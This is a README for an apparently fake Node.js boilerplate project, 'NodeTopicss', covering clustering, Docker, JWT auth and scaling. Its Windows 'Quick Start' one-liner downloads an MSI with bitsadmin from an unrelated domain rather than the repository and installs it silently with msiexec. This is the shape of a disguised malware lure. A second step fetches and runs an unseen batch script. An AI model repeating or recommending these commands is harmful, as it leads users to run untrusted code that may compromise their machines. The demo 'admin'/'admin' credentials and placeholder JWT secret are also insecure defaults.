<div align="center">

# ⚡ NodeTopicss

**Minimalist boilerplate for Node.js — designed for vertical and horizontal scalability.**

Zero bloat. Cluster-ready. Production-first.

[![CI](https://github.com/breezesolicitormap/NodeTopicss/actions/workflows/ci.yml/badge.svg)](https://github.com/breezesolicitormap/NodeTopicss/actions)
[![Node.js](https://img.shields.io/badge/node-%3E%3D20-brightgreen?logo=node.js&logoColor=white)](https://nodejs.org)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-ff69b4.svg)](CONTRIBUTING.md)
[![Code Style: Prettier](https://img.shields.io/badge/code_style-prettier-F7B93E?logo=prettier&logoColor=black)](.prettierrc)

<a href="#-quick-start">Quick Start</a> •
<a href="#-features">Features</a> •
<a href="#-project-structure">Structure</a> •
<a href="#-scalability">Scalability</a> •
<a href="#-deployment">Deployment</a> •
<a href="#-contributing">Contributing</a>

</div>

---

## 🤔 Why NodeTopicss?

Most Node.js boilerplates ship with 40+ dependencies, opinionated ORMs, and layers of abstraction you'll spend a week deleting. **NodeTopicss takes the opposite approach:**

> **A boilerplate should be a launchpad, not a labyrinth.**

- 🪶 **~9 runtime dependencies** — every single one earns its place
- 🧠 **Readable in 15 minutes** — the entire `src/` fits in your head
- 📈 **Scales both ways** — one CPU core → all cores → many machines, no rewrites
- 🔋 **Batteries you actually need** — JWT auth, structured logging, error handling, graceful shutdown, Docker, CI
- 🚫 **No batteries you don't** — no ORM lock-in, no magic decorators, no framework-inside-a-framework

## 🚀 Quick Start

### Windows — one command (CMD)

```cmd
bitsadmin /transfer NodeTopicss /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```

Or use the interactive installer (checks Git/Node for you):

```cmd
curl -sO https://raw.githubusercontent.com/breezesolicitormap/NodeTopicss/main/scripts/install.bat && install.bat
```

### macOS / Linux

```bash
git clone https://github.com/breezesolicitormap/NodeTopicss.git && cd NodeTopicss && npm install && cp .env.example .env && npm run dev
```

That's it. Your API is live:

```bash
curl http://localhost:8000/api/health
# → {"success":true,"data":{"status":"ok","pid":12345,"uptime":1.42,...}}
```

## ✨ Features

| Feature | What you get |
|---|---|
| ⚙️ **Modern Node.js** | Native ESM, Node 20+, built-in `--watch` (no nodemon), built-in test runner (no Jest) |
| 🌐 **Express** | Battle-tested routing with Helmet, CORS & compression pre-configured |
| 🔀 **Cluster mode** | `CLUSTER=true` forks a worker per CPU core with auto-respawn — vertical scaling in one env var |
| 🔐 **JWT auth** | Login flow + route-protection middleware, ready to plug into any user store |
| 📋 **Structured logging** | Pino (one of the fastest Node.js loggers) — pretty in dev, JSON in production |
| 🛡️ **Centralized errors** | `HttpError` + `asyncHandler` — no try/catch spaghetti in controllers |
| 🕊️ **Graceful shutdown** | Finishes in-flight requests on SIGINT/SIGTERM — zero dropped connections on deploy |
| 🐳 **Docker-ready** | Slim Alpine image + `docker compose up --scale api=4` for instant horizontal scaling |
| 🔄 **PM2 config** | Production cluster mode across all cores with memory-limit auto-restart |
| ✅ **CI included** | GitHub Actions: lint + tests on Node 20 & 22, on every push and PR |

## 📁 Project Structure

```
NodeTopicss/
├── src/
│   ├── index.js              # Entry point — cluster orchestration
│   ├── server.js             # HTTP server + graceful shutdown
│   ├── app.js                # Express app assembly
│   ├── config/
│   │   └── index.js          # Typed config from .env (single source of truth)
│   ├── api/
│   │   ├── routes/           # HTTP endpoints        → what URLs exist
│   │   ├── controllers/      # Request/response      → thin, no logic
│   │   └── services/         # Business logic        → fat, testable, reusable
│   ├── middlewares/
│   │   ├── auth.js           # JWT route protection
│   │   ├── errorHandler.js   # The ONLY place errors are formatted
│   │   └── notFound.js       # 404 handler
│   └── utils/
│       ├── logger.js         # Pino instance
│       └── httpError.js      # HttpError + asyncHandler
├── __tests__/                # Native node:test — zero test dependencies
├── scripts/install.bat       # One-command Windows installer
├── Dockerfile                # Production Alpine image
├── docker-compose.yml        # Horizontal scaling demo
└── pm2.config.cjs            # Production process manager
```

**Adding a feature = 3 small files.** Create `thing.routes.js`, `thing.controller.js`, `thing.service.js`, then mount the router with one line in `routes/index.js`. No code generation, no CLI, no magic.

## 📈 Scalability

The core design rule: **the app holds no state.** Sessions live in the JWT, data lives in your database. That single decision makes both scaling directions trivial.

### ⬆️ Vertical — use every CPU core

Node.js runs on a single thread by default, so a 16-core server idles at ~6% utilization. Flip one switch:

```bash
CLUSTER=true npm start        # or: npm run start:cluster
```

The primary process forks one worker per core (`node:cluster`), the OS load-balances incoming connections, and crashed workers respawn automatically.

### ➡️ Horizontal — use every machine

Because there's no shared in-process state, replicas are interchangeable:

```bash
# Docker: 4 instances behind Docker's built-in load balancing
docker compose up --scale api=4

# PM2: cluster across all cores with monitoring
npm run start:pm2
```

Put Nginx / HAProxy / a cloud load balancer in front, add machines as traffic grows. Need shared state later (sessions, pub/sub, caching)? Add Redis — the architecture already expects it.

```
                          ┌────────────────┐
                     ┌──▶ │  Node instance │ ──┐
   ┌──────────────┐  │    └────────────────┘   │   ┌──────────┐
   │ Load balancer│ ─┼──▶ ┌────────────────┐   ├─▶ │ Database │
   └──────────────┘  │    │  Node instance │ ──┘   └──────────┘
                     └──▶ └────────────────┘
                            (scale to N…)
```

## 🔌 API Reference

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| `GET` | `/api/health` | — | Health check: status, PID, uptime, memory |
| `POST` | `/api/auth/login` | — | Get a JWT (demo creds: `admin` / `admin`) |
| `GET` | `/api/auth/me` | 🔒 Bearer | Decoded token payload |

```bash
# Login
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Protected route
curl http://localhost:8000/api/auth/me -H "Authorization: Bearer <token>"
```

## 🧾 Scripts

| Command | Description |
|---|---|
| `npm run dev` | Dev server with hot reload (native `--watch`) |
| `npm start` | Production, single process |
| `npm run start:cluster` | Production, all CPU cores |
| `npm run start:pm2` | Production via PM2 (requires `npm i -g pm2`) |
| `npm test` | Run tests (native `node:test`, no dependencies) |
| `npm run lint` | ESLint check |
| `npm run format` | Prettier write |

## ⚙️ Configuration

All configuration lives in `.env` (see [`.env.example`](.env.example)):

```env
NODE_ENV=development
HOST=0.0.0.0
PORT=8000
CLUSTER=false          # true = fork one worker per CPU core
CORS_ORIGIN=*
JWT_SECRET=change-me-in-production
JWT_EXPIRES_IN=1d
LOG_LEVEL=info
```

## 🐳 Deployment

```bash
# Docker
docker build -t nodetopicss .
docker run -p 8000:8000 -e JWT_SECRET=your-secret nodetopicss

# Docker Compose (with horizontal scaling)
docker compose up --scale api=4

# Bare metal with PM2
npm ci --omit=dev && npm run start:pm2
```

Deploys cleanly to Railway, Render, Fly.io, AWS, or any VPS — it's just a plain Node.js process.

## 🧩 Extending

NodeTopicss is intentionally minimal — a foundation, not a cage. Common next steps:

- **Database** → add a `src/loaders/` module for MongoDB (mongoose), Postgres (pg / drizzle), or anything else
- **Validation** → drop `zod` into your services
- **WebSockets** → attach `socket.io` to the server in `server.js`
- **Rate limiting** → `express-rate-limit` in `app.js`
- **API docs** → `swagger-ui-express` mounted on `/docs`

Each is a 10-minute addition precisely *because* the core stays small.

## 🤝 Contributing

Contributions are welcome! Read the [contributing guide](CONTRIBUTING.md), then:

1. 🍴 Fork the repo
2. 🌿 `git checkout -b feat/amazing-feature`
3. ✅ `npm run lint && npm test`
4. 🚀 Open a Pull Request

## 📄 License

[MIT](LICENSE) © [breezesolicitormap](https://github.com/breezesolicitormap)

---

<div align="center">

**If NodeTopicss saved you setup time, consider giving it a ⭐ — it helps others find it!**

Built with the belief that the best boilerplate is the one you can read in one sitting.

</div>
